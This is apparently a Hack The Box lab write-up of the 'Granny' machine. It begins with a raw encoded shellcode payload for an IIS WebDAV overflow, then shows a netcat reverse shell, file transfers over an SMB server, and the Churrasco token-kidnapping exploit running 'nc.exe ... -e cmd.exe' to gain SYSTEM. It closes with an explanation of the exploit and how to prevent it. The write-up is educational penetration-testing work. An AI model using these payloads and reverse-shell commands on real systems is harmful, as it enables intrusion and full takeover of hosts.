<http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁVVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```


```
kali@kali:~/htb/Granny$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.85.227 1054
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

So we are not root yet. 
Let’s check the systeminfo:

```
C:\WINDOWS\Temp>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 41 Minutes, 10 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 796 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,330 MB
Page File: In Use:         140 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

C:\WINDOWS\Temp>
```

So we have an x86 Windows Server 2003

```
kali@kali:~/htb/Granny$ searchsploit Microsoft Windows Server 2003
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows Server 2000 < 2008 - Embedded OpenType Font Engine Remote Code Execution (MS09-065) (Metasploit)     | windows/dos/10068.rb
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                         | windows/remote/7132.py
Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (1)                                                        | windows/remote/30635.pl
Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (2)                                                        | windows/remote/30636.pl
Microsoft Windows Server 2003 - '.EOT' Blue Screen of Death Crash                                                      | windows/dos/9417.txt
Microsoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow                                               | windows/dos/16166.py
Microsoft Windows Server 2003 - NetpIsRemote() Remote Overflow (MS06-040) (Metasploit)                                 | windows/remote/2355.pm
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                                            | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                                              | windows/local/35936.py
Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)                                       | windows/local/37755.c
Microsoft Windows SQL Server - Remote Denial of Service (MS03-031)                                                     | windows/dos/65.c
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

And there are quite a few exploits. I’m looking at MS14-070, and Token Kidnapping.

I run netstat -nat to see what possibilities I have of uploading the exploit.

```
C:\WINDOWS\Temp>netstat -nat
netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5859           0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.85.227:80       10.10.14.21:44626      CLOSE_WAIT      InHost      
  TCP    10.129.85.227:80       10.10.14.21:44628      CLOSE_WAIT      InHost      
  TCP    10.129.85.227:139      0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.85.227:1054     10.10.14.21:1337       CLOSE_WAIT      InHost      
  TCP    10.129.85.227:1055     10.10.14.21:1337       ESTABLISHED     InHost      
  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       InHost      
  UDP    0.0.0.0:445            *:*                    
  UDP    0.0.0.0:500            *:*                    
  UDP    0.0.0.0:1027           *:*                    
  UDP    0.0.0.0:4500           *:*                    
  UDP    10.129.85.227:123      *:*                    
  UDP    10.129.85.227:137      *:*                    
  UDP    10.129.85.227:138      *:*                    
  UDP    127.0.0.1:123          *:*                    
  UDP    127.0.0.1:1029         *:*                    
```

445 is most likely SMB. So let’s try to open a smb server to upload files.

```
kali@kali:~/htb/Granny$ sudo impacket-smbserver smb .
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Smb is the name of the smb share, and the “.” just means to host it from the current directory.

I then run `copy \\10.10.14.21\smb\winPEAS.exe winPEAS.exe` on the box and download the file:

```
C:\WINDOWS\Temp>copy \\10.10.14.21\smb\37755.exe 37755.exe
copy \\10.10.14.21\smb\37755.exe 37755.exe
        1 file(s) copied.

C:\WINDOWS\Temp>37755.exe
37755.exe
Program too big to fit in memory

C:\WINDOWS\Temp>copy \\10.10.14.21\smb\35936.exe 35936.exe
copy \\10.10.14.21\smb\35936.exe 35936.exe
        1 file(s) copied.

C:\WINDOWS\Temp>35936.exe
35936.exe
Program too big to fit in memory

C:\WINDOWS\Temp>
```

So MS14-070 is not working.

Let's do the token kidnapping. I googled the name of the exploit and found the exploit-db page: https://www.exploit-db.com/exploits/6705 

You can either compile churrasco.exe from the link in the exploit-db, or just download it here: https://github.com/Re4son/Churrasco 

Churrasco will let us run any command as root. So we just need to upload churrasco and netcat, and then just connect back to us. And we will have root.


```
C:\WINDOWS\Temp>copy \\10.10.14.21\smb\churrasco.exe churrasco.exe
copy \\10.10.14.21\smb\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.21\smb\nc.exe nc.exe
copy \\10.10.14.21\smb\nc.exe nc.exe
        1 file(s) copied.
```
Now we just run the standard nc reverse shell command after churrasco.

```
C:\WINDOWS\Temp>churrasco.exe -d "nc.exe 10.10.14.21 1338 -e cmd.exe"
churrasco.exe -d "nc.exe 10.10.14.21 1338 -e cmd.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 676 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 696 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

C:\WINDOWS\Temp>
```

And on our listener:

```
kali@kali:~/htb/Granny$ sudo rlwrap nc -nlvp 1338
[sudo] password for kali: 
Listening on 0.0.0.0 1338
Connection received on 10.129.85.241 1039
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

Success!
I recommend the original presentation by Cesar Cerrudo here: https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf 

To understand the exploit, we need a couple of underlying understandings:


Threads with impersonation privileges can run code under another user account. This privilege is called “Impersonate a client after authentication” (SeImpersonatePrivilege) 
When a thread impersonates, it gets an associated impersonation token.
An access token describes the security context of a process or thread.
There are two types of access tokens
Primary tokens are assigned to processes
Impersonation tokens are created when something is impersonated.
There are four impersonation levels: SecurityAnonymous, SecurityIdentity, SecurityImpersonation, and SecurityDelegation
Services can run under LOCAL SYSTEM, NETWORK SERVICE, LOCAL SERVICE and user accounts
Services cannot directly access a service running under the same account.
Impersonation takes place mostly during Inter Process Communication (IPC) using Local Procedure Call (LPC), Named Pipes, etc.
Inter Process Communication (IPC) using Local Procedure Call (LPC), Named Pipes, etc.
Impersonation can be limited by clients by setting proper options in the used functions
Service threads have default account permissions
Services CAN directly access threads of a service running under the same account.
So service X can run arbitrary code on service Y
Which means service X can get an impersonation token from service Y
Threads from RpcSs service process (runs under NetworkService) can be accessed
This process always has impersonation tokens from many different accounts including SYSTEM
So we first need to get a NetworkService impersonation token, and use that to access rpCSs threads.
Calling the APi that interacts with a service results in getting the service impersonation token.
This essentially means any service can run code as SYSTEM(root)
For example:
Any ASP web page, CGI, etc. on IIS can run code as SYSTEM

Deeper understanding about this, and how it differs on Vista and Server 2008 can be found in the link above.

## Comparing myself to the official writeup:
The official writeup used a modified version of this exploit: https://www.exploit-db.com/exploits/16471/ 

Then uses metasploit to get a meterpreter shell. 

After that they use the local exploit suggester to find possible exploits to use. And simply use metasploit to exploit the meterpreter session.


## How to stop this exploit:

Update IIS. The main issue is a buffer overflow in the 'ScStoragePathFromUrl' function. An awesome explanation of patching this can be found here: https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html 

The token impersonation exploit can be fixed by either updating to a newer system, or not allowing users to execute binaries.
